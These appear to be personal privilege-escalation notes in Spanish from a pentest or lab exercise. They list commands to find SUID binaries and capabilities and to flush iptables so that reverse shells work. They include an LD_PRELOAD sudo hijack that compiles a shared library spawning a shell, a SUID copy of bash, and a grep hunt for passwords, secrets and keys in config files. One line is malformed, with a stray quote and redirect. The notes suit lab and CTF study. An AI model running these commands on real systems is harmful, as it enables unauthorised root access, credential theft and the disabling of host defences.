**Búsqueda SUID:** 
```
find / -perm -4000 2>/dev/null

O

/usr/bin/getcap -r / 2>/dev/null
```

**Búsqueda Capabilities:** 
```
/sbin/getcap -r / 2>/dev/null
```

Desactivar las reglas justas del Firewall para poder ejecutar reverses shells:
```
iptables -P OUTPUT ACCEPT; iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -F
```

Si tenemos esto:
![[Pasted image 20251206173545.png]]
usamos esto para hijacking de lirberias por estar el preload en el sudo -l:
```
jesus@intranet-1:/tmp$ echo '#include <stdlib.h>' > /tmp/shell.c
jesus@intranet-1:/tmp$ echo '#include <unistd.h>' >> /tmp/shell.c
jesus@intranet-1:/tmp$ echo 'void _init() { unsetenv("LD_PRELOAD"); setuid(geteuid()); setgid(getegid()); execl("/bin/sh", "sh", NULL); }' >> /tmp/shell.c
jesus@intranet-1:/tmp$ gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
jesus@intranet-1:/tmp$ sudo -u netadm LD_PRELOAD=/tmp/shell.so /usr/bin/uptime
```


Copiar el /bin/bash y darle permisos de suid:
```
cp /bin/bash /tmp/root_shell && chmod u+s /tmp/root_shell" > Script_suplantado.sh
```

Búsqueda de contraseñas y claves:
```
find / -type f -readable 2>/dev/null | grep -E 'conf$|ini$' | xargs grep -H -E 'password|secret|key' 2>/dev/null
```